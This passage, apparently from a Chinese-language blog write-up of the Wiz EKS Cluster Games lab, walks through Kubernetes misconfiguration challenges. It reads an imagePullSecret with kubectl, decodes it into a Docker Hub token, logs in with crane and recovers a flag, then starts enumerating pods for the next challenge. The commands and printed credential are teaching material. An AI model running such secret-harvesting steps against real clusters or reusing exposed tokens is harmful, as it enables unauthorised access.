class="string">&quot;sources&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;serviceAccountToken&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;expirationSeconds&quot;</span>: <span class="number">3607</span>,</span><br><span class="line">                                <span class="string">&quot;path&quot;</span>: <span class="string">&quot;token&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;configMap&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;ca.crt&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;path&quot;</span>: <span class="string">&quot;ca.crt&quot;</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                ],</span><br><span class="line">                                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-root-ca.crt&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;downwardAPI&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="string">&quot;fieldRef&quot;</span>: &#123;</span><br><span class="line">                                            <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">                                            <span class="string">&quot;fieldPath&quot;</span>: <span class="string">&quot;metadata.namespace&quot;</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="string">&quot;path&quot;</span>: <span class="string">&quot;namespace&quot;</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                ]</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;conditions&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Initialized&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2025-06-03T19:29:01Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Ready&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2025-06-03T19:29:01Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;ContainersReady&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PodScheduled&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;containerStatuses&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;containerID&quot;</span>: <span class="string">&quot;containerd://c838e73cc2552883acf9e44bf43de120aa7d061fb1f23b7bd8e47466550a3413&quot;</span>,</span><br><span class="line">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;docker.io/eksclustergames/base_ext_image:latest&quot;</span>,</span><br><span class="line">                <span class="string">&quot;imageID&quot;</span>: <span class="string">&quot;docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623&quot;</span>,</span><br><span class="line">                <span class="string">&quot;lastState&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;terminated&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;containerID&quot;</span>: <span class="string">&quot;containerd://bf4b3fd600cc0a2db931c71cc6c381abe5d2ba6b25abc7133f209e4b0402e01f&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;exitCode&quot;</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="string">&quot;finishedAt&quot;</span>: <span class="string">&quot;2025-06-03T19:28:59Z&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;reason&quot;</span>: <span class="string">&quot;Completed&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;startedAt&quot;</span>: <span class="string">&quot;2025-04-28T13:06:42Z&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;my-container&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ready&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;restartCount&quot;</span>: <span class="number">16</span>,</span><br><span class="line">                <span class="string">&quot;started&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;state&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;running&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;startedAt&quot;</span>: <span class="string">&quot;2025-06-03T19:29:00Z&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;hostIP&quot;</span>: <span class="string">&quot;192.168.21.50&quot;</span>,</span><br><span class="line">        <span class="string">&quot;phase&quot;</span>: <span class="string">&quot;Running&quot;</span>,</span><br><span class="line">        <span class="string">&quot;podIP&quot;</span>: <span class="string">&quot;192.168.12.173&quot;</span>,</span><br><span class="line">        <span class="string">&quot;podIPs&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;192.168.12.173&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;qosClass&quot;</span>: <span class="string">&quot;BestEffort&quot;</span>,</span><br><span class="line">        <span class="string">&quot;startTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:05Z&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# </span><br></pre></td></tr></table></figure>

<p>题目也说了叫检查容器注册表，由于这里有pod的get和list权限已经会泄露很多信息了</p>
<p>因此接下来看这部分，主要关注spec和status两个部分，分别有15和8个属性</p>
<p>然后再看其下的imagePullSecrets</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%205qwtqwtqw.png?imageSlim" alt="image.png"></p>
<p>那么 <code>imagePullSecrets</code>是干嘛用的？</p>
<p><code>imagePullSecrets</code>是用于在Kubernetes集群中拉取 <code>私有Docker镜像</code>的一种机制</p>
<p>Pods可以通过<code>imagePullSecrets</code>配置项指定一个或多个用于身份验证的凭据，以访问私有的Docker镜像仓库</p>
<p><code>imagePullSecrets</code>通常包含一个或多个Docker Registry的凭据，包括用户名、密码等信息。</p>
<p>这些凭据被加密存储在Kubernetes集群中，并在Pods启动时自动注入到相应的容器中，以便访问需要身份验证的私有镜像</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%206qwtqwt.png?imageSlim" alt="image.png"></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secret registry-pull-secrets-780bab1d -o yaml</span><br><span class="line"><span class="attr">apiVersion</span>: v1</span><br><span class="line"><span class="attr">data</span>:</span><br><span class="line">  .<span class="property">dockerconfigjson</span>: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19</span><br><span class="line"><span class="attr">kind</span>: <span class="title class_">Secret</span></span><br><span class="line"><span class="attr">metadata</span>:</span><br><span class="line">  <span class="attr">annotations</span>:</span><br><span class="line">    pulumi.<span class="property">com</span>/<span class="attr">autonamed</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp</span>: <span class="string">&quot;2023-11-01T13:31:29Z&quot;</span></span><br><span class="line">  <span class="attr">name</span>: registry-pull-secrets-780bab1d</span><br><span class="line">  <span class="attr">namespace</span>: challenge2</span><br><span class="line">  <span class="attr">resourceVersion</span>: <span class="string">&quot;897340&quot;</span></span><br><span class="line">  <span class="attr">uid</span>: 1348531e-57ff-42df-b074-d9ecd566e18b</span><br><span class="line"><span class="attr">type</span>: kubernetes.<span class="property">io</span>/dockerconfigjson</span><br></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;auths&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;index.docker.io/v1/&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再解码</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">eksclustergames</span>:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br></pre></td></tr></table></figure>

<p>OK拿到用户名eksclustergames和密码dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</p>
<p>题目说已经装了crane（无 Docker 环境也能用的容器镜像命令行工具，支持拉取、推送、导出、查看和修改容器镜像）</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# crane auth login index.<span class="property">docker</span>.<span class="property">io</span> -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo</span><br><span class="line"><span class="number">2025</span>/<span class="number">07</span>/<span class="number">09</span> <span class="number">06</span>:<span class="number">19</span>:<span class="number">58</span> logged <span class="keyword">in</span> via /home/user/.<span class="property">docker</span>/config.<span class="property">json</span></span><br></pre></td></tr></table></figure>

<p>刚才不是进不去容器吗没有create权限，现在我们通过拿到了私有仓库的凭据来进行查看这个容器依赖的镜像的详细配置</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crane config index.<span class="property">docker</span>.<span class="property">io</span>/eksclustergames/&lt;镜像名&gt;:&lt;标签&gt;</span><br><span class="line">crane config index.<span class="property">docker</span>.<span class="property">io</span>/eksclustergames/<span class="attr">base_ext_image</span>:latest</span><br></pre></td></tr></table></figure>

<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%207qwtqwtq.png?imageSlim" alt="image.png"></p>
<p>拿flag：wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}</p>
<h1 id="Image-Inquisition"><a href="#Image-Inquisition" class="headerlink" title="Image Inquisition"></a><strong>Image Inquisition</strong></h1><p>这个题意向是想让我们从镜像层作为出发点去信息收集，去深入研究ECR存储库（但我不知道这是啥玩意，边打边学吧……）</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%208qwtqwtq.png?imageSlim" alt="image.png"></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;list&quot;</span>,</span><br><span class="line">        <span class="string">&quot;get&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有这些权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl auth can-i --list</span><br><span class="line"><span class="attr">warning</span>: the list may be <span class="attr">incomplete</span>: webhook authorizer does not support user rule resolution</span><br><span class="line"><span class="title class_">Resources</span>                                       <span class="title class_">Non</span>-<span class="title class_">Resource</span> <span class="title class_">URLs</span>                     <span class="title class_">Resource</span> <span class="title class_">Names</span>     <span class="title class_">Verbs</span></span><br><span class="line">selfsubjectaccessreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>   []                                    []                 [create]</span><br><span class="line">selfsubjectrulesreviews.<span class="property">authorization</span>.<span class="property">k8s</span>.<span class="property">io</span>    []                                    []                 [create]</span><br><span class="line">pods                                            []                                    []                 [get list]</span><br><span class="line">                                                [<span class="regexp">/.well-known/</span>openid-configuration]   []                 [get]</span><br><span class="line">                                                [<span class="regexp">/api/</span>*]                              []                 [get]</span><br><span class="line">                                                [/api]                                []                 [get]</span><br><span class="line">                                                [<span class="regexp">/apis/</span>*]                             []                 [get]</span><br><span class="line">                                                [/apis]                               []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/healthz]                            []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [/livez]                              []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openapi/</span>*]                          []                 [get]</span><br><span class="line">                                                [/openapi]                            []                 [get]</span><br><span class="line">                                                [<span class="regexp">/openid/</span>v1/jwks]                     []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [/readyz]                             []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [<span class="regexp">/version/</span>]                           []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">                                                [/version]                            []                 [get]</span><br><span class="line">podsecuritypolicies.<span class="property">policy</span>                      []                                    [eks.<span class="property">privileged</span>]   [use]</span><br></pre></td></tr></table></figure>

<p>列举pods</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods</span><br><span class="line"><span class="variable constant_">NAME</span>                      <span class="variable constant_">READY</span>   <span class="variable constant_">STATUS</span>    <span class="variable constant_">RESTARTS</span>       <span class="variable constant_">AGE</span></span><br><span class="line">accounting-pod-876647f8   <span class="number">1</span>/<span class="number">1</span>     <span class="title class_">Running</span>   <span class="number">16</span> (35d ago)   615d</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods accounting-pod-876647f8 -o json</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;annotations&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;kubernetes.io/psp&quot;</span>: <span class="string">&quot;eks.privileged&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pulumi.com/autonamed&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-11-01T13:32:10Z&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;accounting-pod-876647f8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;247278737&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;dd2256ae-26ca-4b94-a4bf-4ac1768a54e2&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;spec&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;containers&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;image&quot;</span>: <span class="string">&quot;688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01&quot;</span>,</span><br><span class="line">                <span class="string">&quot;imagePullPolicy&quot;</span>: <span class="string">&quot;IfNotPresent&quot;</span>,</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;accounting-container&quot;</span>,</span><br><span class="line">                <span class="string">&quot;resources&quot;</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">&quot;terminationMessagePath&quot;</span>: <span class="string">&quot;/dev/termination-log&quot;</span>,</span><br><span class="line">                <span class="string">&quot;terminationMessagePolicy&quot;</span>: <span class="string">&quot;File&quot;</span>,</span><br><span class="line">                <span class="string">&quot;volumeMounts&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;mountPath&quot;</span>: <span class="string">&quot;/var/run/secrets/kubernetes.io/serviceaccount&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-api-access-mmvjj&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;readOnly&quot;</span>: <span class="literal">true</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;dnsPolicy&quot;</span>: <span class="string">&quot;ClusterFirst&quot;</span>,</span><br><span class="line">        <span class="string">&quot;enableServiceLinks&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;nodeName&quot;</span>: <span class="string">&quot;ip-192-168-21-50.us-west-1.compute.internal&quot;</span>,</span><br><span class="line">        <span class="string">&quot;preemptionPolicy&quot;</span>: <span class="string">&quot;PreemptLowerPriority&quot;</span>,</span><br><span class="line">        <span class="string">&quot;priority&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;restartPolicy&quot;</span>: <span class="string">&quot;Always&quot;</span>,</span><br><span class="line">        <span class="string">&quot;schedulerName&quot;</span>: <span class="string">&quot;default-scheduler&quot;</span>,</span><br><span class="line">        <span class="string">&quot;securityContext&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;serviceAccount&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;serviceAccountName&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;terminationGracePeriodSeconds&quot;</span>: <span class="number">30</span>,</span><br><span class="line">        <span class="string">&quot;tolerations&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;effect&quot;</span>: <span class="string">&quot;NoExecute&quot;</span>,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;node.kubernetes.io/not-ready&quot;</span>,</span><br><span class="line">                <span class="string">&quot;operator&quot;</span>: <span class="string">&quot;Exists&quot;</span>,</span><br><span class="line">                <span class="string">&quot;tolerationSeconds&quot;</span>: <span class="number">300</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;effect&quot;</span>: <span class="string">&quot;NoExecute&quot;</span>,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>: <span class="string">&quot;node.kubernetes.io/unreachable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;operator&quot;</span>: <span class="string">&quot;Exists&quot;</span>,</span><br><span class="line">                <span class="string">&quot;tolerationSeconds&quot;</span>: <span class="number">300</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;volumes&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-api-access-mmvjj&quot;</span>,</span><br><span class="line">                <span class="string">&quot;projected&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;defaultMode&quot;</span>: <span class="number">420</span>,</span><br><span class="line">                    <span class="string">&quot;sources&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;serviceAccountToken&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;expirationSeconds&quot;</span>: <span class="number">3607</span>,</span><br><span class="line">                                <span class="string">&quot;path&quot;</span>: <span class="string">&quot;token&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;configMap&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="string">&quot;key&quot;</span>: <span class="string">&quot;ca.crt&quot;</span>,</span><br><span class="line">                                        <span class="string">&quot;path&quot;</span>: <span class="string">&quot;ca.crt&quot;</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                ],</span><br><span class="line">                                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;kube-root-ca.crt&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="string">&quot;downwardAPI&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="string">&quot;fieldRef&quot;</span>: &#123;</span><br><span class="line">                                            <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">                                            <span class="string">&quot;fieldPath&quot;</span>: <span class="string">&quot;metadata.namespace&quot;</span></span><br><span class="line">                                        &#125;,</span><br><span class="line">                                        <span class="string">&quot;path&quot;</span>: <span class="string">&quot;namespace&quot;</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                ]</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;conditions&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2023-11-01T13:32:10Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Initialized&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span class="string">&quot;2025-06-03T19:28:54Z&quot;</span>,</span><br><span class="line">                <span class="string">&quot;status&quot;</span>: <span class="string">&quot;True&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Ready&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;lastProbeTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="string">&quot;lastTransitionTime&quot;</span>: <span 